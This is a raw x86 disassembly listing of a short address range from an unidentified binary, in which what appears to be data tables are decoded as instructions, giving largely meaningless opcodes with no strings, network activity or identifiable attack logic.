  406991:	1d 15 02 5a 00       	sbb    $0x5a0215,%eax
  406996:	56                   	push   %esi
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	79 21                	jns    0x4069c1
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	85 21                	test   %esp,(%ecx)
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 7e 25 5a    	add    %al,0x5a257e08(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	f0 0f 5f 02          	lock maxps (%edx),%xmm0
  4069cc:	5c                   	pop    %esp
  4069cd:	00 6f 25             	add    %ch,0x25(%edi)
  4069d0:	00 00                	add    %al,(%eax)
  4069d2:	00 00                	add    %al,(%eax)
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	64 1e                	fs push %ds
  4069d8:	64 02 5c 00 7c       	add    %fs:0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	9b                   	fwait
  4069e5:	1e                   	push   %ds
  4069e6:	0e                   	push   %cs
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 28                	add    %ch,(%eax)
  4069f3:	25 b1 02 5c 00       	and    $0x5c02b1,%eax
  4069f8:	8f                   	(bad)
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 0e                	add    %cl,(%esi)
  406a01:	03 b8 02 5e 00 44    	add    0x44005e02(%eax),%edi
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 4e 21             	add    %cl,0x21(%esi)
  406a10:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 9b 1e 0e    	add    %al,0xe1e9b18(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 2f                	add    %ch,(%edi)
  406a2b:	16                   	push   %ss
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 45 09             	add    %al,0x9(%ebp)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 9c 03 d2 02 64 00 	add    %bl,0x6402d2(%ebx,%eax,1)
  406a4c:	ab                   	stos   %eax,%es:(%edi)
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 39                	add    %bh,(%ecx)
  406a55:	0b da                	or     %edx,%ebx
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 30                	add    %dh,(%eax)
  406a63:	01 e1                	add    %esp,%ecx
  406a65:	02 68 00             	add    0x0(%eax),%ch
  406a68:	e6 25                	out    %al,$0x25
  406a6a:	00 00                	add    %al,(%eax)
  406a6c:	00 00                	add    %al,(%eax)
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 90 03 e8 02 6a    	add    %dl,0x6a02e803(%eax)
  406a75:	00 6c 57 00          	add    %ch,0x0(%edi,%edx,2)
  406a79:	00 00                	add    %al,(%eax)
  406a7b:	00 96 00 9a 07 ef    	add    %dl,-0x10f86600(%esi)
  406a81:	02 6c 00 9c          	add    -0x64(%eax,%eax,1),%ch
  406a85:	57                   	push   %edi
  406a86:	00 00                	add    %al,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 95 0b f6 02 6e    	add    %dl,0x6e02f60b(%ebp)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	9b                   	fwait
  406a9b:	1e                   	push   %ds
  406a9c:	0e                   	push   %cs
  406a9d:	00 70 00             	add    %dh,0x0(%eax)
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 71 1c             	add    %dh,0x1c(%ecx)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 29                	add    %ch,(%ecx)
  406ab7:	09 84 01 71 00 00 00 	or     %eax,0x71(%ecx,%eax,1)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	64 16                	fs push %ss
  406ac2:	00 00                	add    %al,(%eax)
  406ac4:	01 00                	add    %eax,(%eax)
  406ac6:	c9                   	leave
  406ac7:	03 00                	add    (%eax),%eax
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 3d 19 00 00 01    	add    %bh,0x1000019
  406ad1:	00 8a 06 00 00 01    	add    %cl,0x1000006(%edx)
  406ad7:	00 56 1c             	add    %dl,0x1c(%esi)
  406ada:	00 00                	add    %al,(%eax)
  406adc:	01 00                	add    %eax,(%eax)
  406ade:	60                   	pusha
  406adf:	0b 00                	or     (%eax),%eax
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 ca                	add    %cl,%dl
  406ae5:	26 00 00             	add    %al,%es:(%eax)
  406ae8:	01 00                	add    %eax,(%eax)
  406aea:	c8 13 00 00          	enter  $0x13,$0x0
  406aee:	01 00                	add    %eax,(%eax)
  406af0:	a9 08 00 00 01       	test   $0x1000008,%eax
  406af5:	00 2b                	add    %ch,(%ebx)
  406af7:	17                   	pop    %ss
  406af8:	00 00                	add    %al,(%eax)
  406afa:	01 00                	add    %eax,(%eax)
  406afc:	22 13                	and    (%ebx),%dl
  406afe:	00 00                	add    %al,(%eax)
  406b00:	01 00                	add    %eax,(%eax)
  406b02:	8a 16                	mov    (%esi),%dl
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	81 17 00 00 03 00    	adcl   $0x30000,(%edi)
  406b0e:	0a 06                	or     (%esi),%al
  406b10:	00 00                	add    %al,(%eax)
  406b12:	04 00                	add    $0x0,%al
  406b14:	09 24 00             	or     %esp,(%eax,%eax,1)
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 d6                	add    %dl,%dh
  406b1b:	26 00 00             	add    %al,%es:(%eax)
  406b1e:	01 00                	add    %eax,(%eax)
  406b20:	13 16                	adc    (%esi),%edx
  406b22:	00 00                	add    %al,(%eax)
  406b24:	01 00                	add    %eax,(%eax)
  406b26:	2e 24 00             	cs and $0x0,%al
  406b29:	00 01                	add    %al,(%ecx)
  406b2b:	00 08                	add    %cl,(%eax)
  406b2d:	1b 00                	sbb    (%eax),%eax
  406b2f:	00 01                	add    %al,(%ecx)
  406b31:	00 d7                	add    %dl,%bh
  406b33:	1e                   	push   %ds
  406b34:	00 00                	add    %al,(%eax)
  406b36:	01 00                	add    %eax,(%eax)
  406b38:	3c 01                	cmp    $0x1,%al
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	eb 09                	jmp    0x406b49
  406b40:	00 00                	add    %al,(%eax)
  406b42:	02 00                	add    (%eax),%al
  406b44:	aa                   	stos   %al,%es:(%edi)
  406b45:	07                   	pop    %es
  406b46:	00 00                	add    %al,(%eax)
  406b48:	03 00                	add    (%eax),%eax
  406b4a:	ba 1a 00 00 01       	mov    $0x100001a,%edx
  406b4f:	00 c3                	add    %al,%bl
  406b51:	24 00                	and    $0x0,%al
  406b53:	00 01                	add    %al,(%ecx)
  406b55:	00 d6                	add    %dl,%dh
  406b57:	03 00                	add    (%eax),%eax
  406b59:	00 02                	add    %al,(%edx)
  406b5b:	00 43 08             	add    %al,0x8(%ebx)
  406b5e:	00 00                	add    %al,(%eax)
  406b60:	01 00                	add    %eax,(%eax)
  406b62:	7b 0b                	jnp    0x406b6f
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	86 13                	xchg   %dl,(%ebx)
  406b6a:	00 00                	add    %al,(%eax)
  406b6c:	02 00                	add    (%eax),%al
  406b6e:	3f                   	aas
  406b6f:	05 00 00 03 00       	add    $0x30000,%eax
  406b74:	e4 04                	in     $0x4,%al
  406b76:	00 00                	add    %al,(%eax)
  406b78:	01 00                	add    %eax,(%eax)
  406b7a:	17                   	pop    %ss
  406b7b:	24 00                	and    $0x0,%al
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 dc                	add    %bl,%ah
  406b81:	09 00                	or     %eax,(%eax)
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 e5                	add    %ah,%ch
  406b87:	02 00                	add    (%eax),%al
  406b89:	00 02                	add    %al,(%edx)
  406b8b:	00 7a 09             	add    %bh,0x9(%edx)
  406b8e:	00 00                	add    %al,(%eax)
  406b90:	01 00                	add    %eax,(%eax)
  406b92:	d6                   	salc
  406b93:	06                   	push   %es
  406b94:	00 00                	add    %al,(%eax)
  406b96:	01 00                	add    %eax,(%eax)
  406b98:	6e                   	outsb  %ds:(%esi),(%dx)
  406b99:	0b 00                	or     (%eax),%eax
  406b9b:	00 01                	add    %al,(%ecx)
  406b9d:	00 3e                	add    %bh,(%esi)
  406b9f:	15 00 00 01 00       	adc    $0x10000,%eax
  406ba4:	bf 09 00 00 01       	mov    $0x1000009,%edi
  406ba9:	00 85 04 00 00 01    	add    %al,0x1000004(%ebp)
  406baf:	00 e8                	add    %ch,%al
  406bb1:	01 00                	add    %eax,(%eax)
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 70 16             	add    %dh,0x16(%eax)
  406bb8:	00 00                	add    %al,(%eax)
  406bba:	01 00                	add    %eax,(%eax)
  406bbc:	89 12                	mov    %edx,(%edx)
  406bbe:	00 00                	add    %al,(%eax)
  406bc0:	01 00                	add    %eax,(%eax)
  406bc2:	bd 04 00 00 01       	mov    $0x1000004,%ebp
  406bc7:	00 97 06 00 00 01    	add    %dl,0x1000006(%edi)
  406bcd:	00 99 16 00 00 02    	add    %bl,0x2000016(%ecx)
  406bd3:	00 59 19             	add    %bl,0x19(%ecx)
  406bd6:	00 00                	add    %al,(%eax)
  406bd8:	01 00                	add    %eax,(%eax)
  406bda:	63 06                	arpl   %eax,(%esi)
  406bdc:	00 00                	add    %al,(%eax)
  406bde:	01 00                	add    %eax,(%eax)
  406be0:	ce                   	into
  406be1:	02 00                	add    (%eax),%al
  406be3:	00 01                	add    %al,(%ecx)
  406be5:	00 9e 0a 00 00 01    	add    %bl,0x100000a(%esi)
  406beb:	00 66 03             	add    %ah,0x3(%esi)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	79 05                	jns    0x406bf9
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	d3 0a                	rorl   %cl,(%edx)
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	ca 04 00             	lret   $0x4
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 3b                	add    %bh,(%ebx)
  406c05:	17                   	pop    %ss
  406c06:	00 00                	add    %al,(%eax)
  406c08:	01 00                	add    %eax,(%eax)
  406c0a:	da 01                	fiaddl (%ecx)
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	75 04                	jne    0x406c16
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	7f 1c                	jg     0x406c34
  406c18:	00 00                	add    %al,(%eax)
  406c1a:	01 00                	add    %eax,(%eax)
  406c1c:	b4 24                	mov    $0x24,%ah
  406c1e:	00 00                	add    %al,(%eax)
  406c20:	01 00                	add    %eax,(%eax)
  406c22:	19 04 00             	sbb    %eax,(%eax,%eax,1)
  406c25:	00 02                	add    %al,(%edx)
  406c27:	00 61 09             	add    %ah,0x9(%ecx)
  406c2a:	00 00                	add    %al,(%eax)
  406c2c:	01 00                	add    %eax,(%eax)
  406c2e:	dd 24 00             	frstor (%eax,%eax,1)
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 f0                	add    %dh,%al
  406c35:	1a 00                	sbb    (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 56 01             	add    %dl,0x1(%esi)
  406c3c:	00 00                	add    %al,(%eax)
  406c3e:	01 00                	add    %eax,(%eax)
  406c40:	73 01                	jae    0x406c43
  406c42:	00 00                	add    %al,(%eax)
  406c44:	01 00                	add    %eax,(%eax)
  406c46:	3c 03                	cmp    $0x3,%al
  406c48:	00 00                	add    %al,(%eax)
  406c4a:	01 00                	add    %eax,(%eax)
  406c4c:	e3 23                	jecxz  0x406c71
  406c4e:	00 00                	add    %al,(%eax)
  406c50:	01 00                	add    %eax,(%eax)
  406c52:	5c                   	pop    %esp
  406c53:	05 00 00 01 00       	add    $0x10000,%eax
  406c58:	33 07                	xor    (%edi),%eax
  406c5a:	00 00                	add    %al,(%eax)
  406c5c:	01 00                	add    %eax,(%eax)
  406c5e:	3b 13                	cmp    (%ebx),%edx
  406c60:	00 00                	add    %al,(%eax)
  406c62:	01 00                	add    %eax,(%eax)
  406c64:	c7                   	(bad)
  406c65:	1a 00                	sbb    (%eax),%al
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 22                	add    %ah,(%edx)
  406c6b:	24 00                	and    $0x0,%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 8f 01 00 00 01    	add    %cl,0x1000001(%edi)
  406c75:	00 80 03 00 00 02    	add    %al,0x2000003(%eax)
  406c7b:	00 48 1c             	add    %cl,0x1c(%eax)
  406c7e:	00 00                	add    %al,(%eax)
  406c80:	01 00                	add    %eax,(%eax)
  406c82:	00 03                	add    %al,(%ebx)
  406c84:	00 00                	add    %al,(%eax)
  406c86:	02 00                	add    (%eax),%al
  406c88:	32 08                	xor    (%eax),%cl
  406c8a:	00 00                	add    %al,(%eax)
  406c8c:	01 00                	add    %eax,(%eax)
  406c8e:	1d 22 00 00 01       	sbb    $0x1000022,%eax
  406c93:	00 93 04 00 00 01    	add    %dl,0x1000004(%ebx)
  406c99:	00 84 1b 00 00 01 00 	add    %al,0x10000(%ebx,%ebx,1)
  406ca0:	97                   	xchg   %eax,%edi
  406ca1:	12 00                	adc    (%eax),%al
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 24 01             	add    %ah,(%ecx,%eax,1)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	c2 1c 00             	ret    $0x1c
  406caf:	00 01                	add    %al,(%ecx)
  406cb1:	00 ad 01 00 00 01    	add    %ch,0x1000001(%ebp)
  406cb7:	00 1a                	add    %bl,(%edx)
  406cb9:	09 00                	or     %eax,(%eax)
  406cbb:	00 01                	add    %al,(%ecx)
  406cbd:	00 59 21             	add    %bl,0x21(%ecx)
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	58                   	pop    %eax
  406cc5:	17                   	pop    %ss
  406cc6:	00 00                	add    %al,(%eax)
  406cc8:	01 00                	add    %eax,(%eax)
  406cca:	89 09                	mov    %ecx,(%ecx)
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	be 1b 00 00 01       	mov    $0x100001b,%esi
  406cd5:	00 6b 05             	add    %ch,0x5(%ebx)
  406cd8:	00 00                	add    %al,(%eax)
  406cda:	01 00                	add    %eax,(%eax)
  406cdc:	33 05 00 00 01 00    	xor    0x10000,%eax
  406ce2:	f0 03 00             	lock add (%eax),%eax
  406ce5:	00 02                	add    %al,(%edx)
  406ce7:	00 c9                	add    %cl,%cl
  406ce9:	06                   	push   %es
  406cea:	00 00                	add    %al,(%eax)
  406cec:	01 00                	add    %eax,(%eax)
  406cee:	b4 1c                	mov    $0x1c,%ah
  406cf0:	00 00                	add    %al,(%eax)
  406cf2:	01 00                	add    %eax,(%eax)
  406cf4:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	cb                   	lret
  406cfb:	1b 00                	sbb    (%eax),%eax
  406cfd:	00 01                	add    %al,(%ecx)
  406cff:	00 82 08 00 00 01    	add    %al,0x1000008(%edx)
  406d05:	00 ff                	add    %bh,%bh
  406d07:	1b 00                	sbb    (%eax),%eax
  406d09:	00 02                	add    %al,(%edx)
  406d0b:	00 74 15 00          	add    %dh,0x0(%ebp,%edx,1)
  406d0f:	00 01                	add    %al,(%ecx)
  406d11:	00 2d 03 00 00 02    	add    %ch,0x2000003
  406d17:	00 57 25             	add    %dl,0x25(%edi)
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	0b 04 00             	or     (%eax,%eax,1),%eax
  406d21:	00 02                	add    %al,(%edx)
  406d23:	00 9a 1c 00 00 01    	add    %bl,0x100001c(%edx)
  406d29:	00 88 05 00 00 02    	add    %cl,0x2000005(%eax)
  406d2f:	00 10                	add    %dl,(%eax)
  406d31:	26 00 00             	add    %al,%es:(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	b7 0a                	mov    $0xa,%bh
  406d38:	00 00                	add    %al,(%eax)
  406d3a:	02 00                	add    (%eax),%al
  406d3c:	54                   	push   %esp
  406d3d:	09 00                	or     %eax,(%eax)
  406d3f:	00 01                	add    %al,(%ecx)
  406d41:	00 53 06             	add    %dl,0x6(%ebx)
  406d44:	00 00                	add    %al,(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	ad                   	lods   %ds:(%esi),%eax
  406d49:	13 00                	adc    (%eax),%eax
  406d4b:	00 01                	add    %al,(%ecx)
  406d4d:	00 40 04             	add    %al,0x4(%eax)
  406d50:	00 00                	add    %al,(%eax)
  406d52:	02 00                	add    (%eax),%al
  406d54:	51                   	push   %ecx
  406d55:	0b 00                	or     (%eax),%eax
  406d57:	00 01                	add    %al,(%ecx)
  406d59:	00 ae 1b 00 00 01    	add    %ch,0x100001b(%esi)
  406d5f:	00 2b                	add    %ch,(%ebx)
  406d61:	0b 16                	or     (%esi),%edx
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 e9 22 bb    	add    %dh,-0x44dd1700(%ecx)
  406d6f:	01 b1 00 a7 23 bf    	add    %esi,-0x40dc5900(%ecx)
  406d75:	01 b1 00 01 22 0e    	add    %esi,0xe220100(%ecx)
  406d7b:	00 b9 00 83 1e 64    	add    %bh,0x641e8300(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 9b 1e 01 03 d1    	add    %bl,-0x2efcfee2(%ebx)
  406d89:	00 9b 1e 0e 00 d9    	add    %bl,-0x26fff1e2(%ebx)
  406d8f:	00 9b 1e 2e 03 e9    	add    %bl,-0x16fcd1e2(%ebx)
  406d95:	00 9b 1e 6b 01 f1    	add    %bl,-0xefe94e2(%ebx)
  406d9b:	00 9b 1e 6b 01 f9    	add    %bl,-0x6fe94e2(%ebx)
  406da1:	00 9b 1e 6b 01 01    	add    %bl,0x1016b1e(%ebx)
  406da7:	01 9b 1e 6b 01 09    	add    %ebx,0x9016b1e(%ebx)
  406dad:	01 9b 1e 6b 01 11    	add    %ebx,0x11016b1e(%ebx)
  406db3:	01 9b 1e 6b 01 19    	add    %ebx,0x19016b1e(%ebx)
  406db9:	01 9b 1e 6b 01 21    	add    %ebx,0x21016b1e(%ebx)
  406dbf:	01 9b 1e 6b 01 29    	add    %ebx,0x29016b1e(%ebx)
  406dc5:	01 9b 1e 6b 01 31    	add    %ebx,0x31016b1e(%ebx)
  406dcb:	01 9b 1e 4b 02 39    	add    %ebx,0x39024b1e(%ebx)
  406dd1:	01 9b 1e 0e 00 41    	add    %ebx,0x41000e1e(%ebx)
  406dd7:	01 9b 1e 6b 01 49    	add    %ebx,0x49016b1e(%ebx)
  406ddd:	01 e9                	add    %ebp,%ecx
  406ddf:	1b 7f 00             	sbb    0x0(%edi),%edi
  406de2:	51                   	push   %ecx
  406de3:	01 44 00 c4          	add    %eax,-0x3c(%eax,%eax,1)
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	32 22                	xor    (%edx),%ah
  406dec:	7f 00                	jg     0x406dee
  406dee:	51                   	push   %ecx
  406def:	01 74 19 84          	add    %esi,-0x7c(%ecx,%ebx,1)
  406df3:	00 09                	add    %cl,(%ecx)
  406df5:	00 9b 1e 0e 00 61    	add    %bl,0x61000e1e(%ebx)
  406dfb:	01 8a 00 cd 03 51    	add    %ecx,0x5103cd00(%edx)
  406e01:	01 97 14 2a 01 61    	add    %edx,0x61012a14(%edi)
  406e07:	01 e9                	add    %ebp,%ecx
  406e09:	14 d3                	adc    $0xd3,%al
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 9b 1e 2b 02 11    	add    %bl,0x11022b1e(%ebx)
  406e13:	00 b2 25 d9 03 69    	add    %dh,0x6903d925(%edx)
  406e19:	01 8a 25 df 03 61    	add    %ecx,0x6103df25(%edx)
  406e1f:	01 f7                	add    %esi,%edi
  406e21:	1f                   	pop    %ds
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 22 02 c7 00    	addl   $0xc70222,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	8c 15 eb 03 19 00    	mov    %ss,0x1903eb
  406e32:	9b                   	fwait
  406e33:	1e                   	push   %ds
  406e34:	09 04 19             	or     %eax,(%ecx,%ebx,1)
  406e37:	00 f2                	add    %dh,%dl
  406e39:	12 01                	adc    (%ecx),%al
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 df                	add    %bl,%bh
  406e3f:	12 01                	adc    (%ecx),%al
  406e41:	03 c1                	add    %ecx,%eax
  406e43:	01 7e 26             	add    %edi,0x26(%esi)
  406e46:	16                   	push   %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 2c 22             	add    %ebp,(%edx,%eiz,1)
  406e4c:	1c 04                	sbb    $0x4,%al
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	9b                   	fwait
  406e51:	1e                   	push   %ds
  406e52:	0e                   	push   %cs
  406e53:	00 d1                	add    %dl,%cl
  406e55:	01 ab 23 23 04 d9    	add    %ebp,-0x26fbdcdd(%ebx)
  406e5b:	01 98 1f 28 04 19    	add    %ebx,0x1904281f(%eax)
  406e61:	00 ae 21 30 04 19    	add    %ch,0x19043021(%esi)
  406e67:	00 de                	add    %bl,%dh
  406e69:	0b bf 01 19 00 ae    	or     -0x51ffe6ff(%edi),%edi
  406e6f:	21 3c 02             	and    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 9b 1e 0e 00 a1    	add    %ebx,-0x5efff1e2(%ebx)
  406e79:	01 9b 1e 36 02 99    	add    %ebx,-0x66fdc9e2(%ebx)
  406e7f:	01 56 20             	add    %edx,0x20(%esi)
  406e82:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e85:	01 b7 14 70 01 c1    	add    %esi,-0x3efe8fec(%edi)
  406e8b:	01 2c 22             	add    %ebp,(%edx,%eiz,1)
  406e8e:	3f                   	aas
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 ab 23 49 04 f1    	add    %ebp,-0xefbb6dd(%ebx)
  406e97:	01 3a                	add    %edi,(%edx)
  406e99:	10 0e                	adc    %cl,(%esi)
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 9b 1e 4f 04 01    	add    %ebx,0x1044f1e(%ebx)
  406ea3:	02 9b 1e 56 04 21    	add    0x2104561e(%ebx),%bl
  406ea9:	00 9b 1e 5c 04 19    	add    %bl,0x19045c1e(%ebx)
  406eaf:	00 1b                	add    %bl,(%ebx)
  406eb1:	23 66 04             	and    0x4(%esi),%esp
  406eb4:	09 00                	or     %eax,(%eax)
  406eb6:	c6                   	(bad)
  406eb7:	14 47                	adc    $0x47,%al
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 97 22 6c 04 29    	add    %dl,0x29046c22(%edi)
  406ec1:	02 9b 1e 56 04 29    	add    0x2904561e(%ebx),%bl
  406ec7:	00 9b 1e 78 04 31    	add    %bl,0x3104781e(%ebx)
  406ecd:	02 9b 1e 56 04 c1    	add    -0x3efba9e2(%ebx),%bl
  406ed3:	00 b6 0b 82 04 39    	add    %dh,0x3904820b(%esi)
  406ed9:	02 95 0f 8f 04 31    	add    0x31048f0f(%ebp),%dl
  406edf:	00 66 20             	add    %ah,0x20(%esi)
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 3a                	add    %bh,(%edx)
  406ee7:	10 0e                	adc    %cl,(%esi)
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 3a                	add    %bh,(%edx)
  406eed:	10 0e                	adc    %cl,(%esi)
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 3a                	add    %bh,(%edx)
  406ef3:	10 0e                	adc    %cl,(%esi)
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 ae 0b a1 04 49    	add    %ch,0x4904a10b(%esi)
  406efd:	02 44 00 a7          	add    -0x59(%eax,%eax,1),%al
  406f01:	04 c1                	add    $0xc1,%al
  406f03:	00 bb 0b ae 04 51    	add    %bh,0x5104ae0b(%ebx)
  406f09:	02 9b 1e 56 04 49    	add    0x4904561e(%ebx),%bl
  406f0f:	01 9b 1e b6 04 49    	add    %ebx,0x4904b61e(%ebx)
  406f15:	01 6a 23             	add    %ebp,0x23(%edx)
  406f18:	bd 04 61 02 22       	mov    $0x22026104,%ebp
  406f1d:	1e                   	push   %ds
  406f1e:	cf                   	iret
  406f1f:	04 49                	add    $0x49,%al
  406f21:	02 f7                	add    %bh,%dh
  406f23:	1f                   	pop    %ds
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 40 18             	add    %al,0x18(%eax)
  406f2a:	d6                   	salc
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 92 10 de 04 59    	add    %dl,0x5904de10(%edx)
  406f33:	02 9b 1e 2b 02 c1    	add    -0x3efdd4e2(%ebx),%bl
  406f39:	00 6e 1a             	add    %ch,0x1a(%esi)
  406f3c:	15 02 c1 00 97       	adc    $0x9700c102,%eax
  406f41:	15 0e 00 61 02       	adc    $0x261000e,%eax
  406f46:	32 22                	xor    (%edx),%ah
  406f48:	9a 00 71 02 a6 21 0a 	lcall  $0xa21,$0xa6027100
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	70 1f                	jo     0x406f73
  406f54:	c7 00 a1 02 d8 0f    	movl   $0xfd802a1,(%eax)
  406f5a:	01 05 79 02 9b 1e    	add    %eax,0x1e9b0279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 fd                	add    %ch,%bh
  406f65:	20 07                	and    %al,(%edi)
  406f67:	05 81 02 dd 0e       	add    $0xedd0281,%eax
  406f6c:	0d 05 a9 02 26       	or     $0x2602a905,%eax
  406f71:	0f 47 02             	cmova  (%edx),%eax
  406f74:	b1 02                	mov    $0x2,%cl
  406f76:	7b 0f                	jnp    0x406f87
  406f78:	47                   	inc    %edi
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 8a 26 16 04 81    	add    %ecx,-0x7efbe9da(%edx)
  406f81:	02 8b 1f 13 05 81    	add    -0x7efaece1(%ebx),%cl
  406f87:	02 3b                	add    (%ebx),%bh
  406f89:	18 0e                	sbb    %cl,(%esi)
  406f8b:	00 89 02 9b 1e 0e    	add    %cl,0xe1e9b02(%ecx)
  406f91:	00 89 02 33 0f 6b    	add    %cl,0x6b0f3302(%ecx)
  406f97:	01 b1 02 1d 0f 47    	add    %esi,0x470f1d02(%ecx)
  406f9d:	02 a1 02 bc 19 c7    	add    -0x38e643fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
